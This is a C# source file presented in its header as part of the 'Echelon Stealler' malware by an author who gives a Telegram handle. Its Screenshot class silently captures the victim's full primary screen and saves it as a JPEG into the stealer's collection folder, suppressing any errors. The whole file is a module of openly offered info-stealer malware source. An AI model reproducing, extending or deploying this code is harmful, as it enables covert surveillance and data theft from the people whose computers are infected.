///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Echelon
{
    
    class Screenshot
    {
        
        public static void Start(string Echelon_Dir)
        {
            try
            {
                int width = Screen.PrimaryScreen.Bounds.Width;
                int height = Screen.PrimaryScreen.Bounds.Height;
                Bitmap bitmap = new Bitmap(width, height);
                Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                bitmap.Save(Echelon_Dir + "\\Screen" + ".Jpeg", ImageFormat.Jpeg);
            }
            catch {}
        }
    }
}
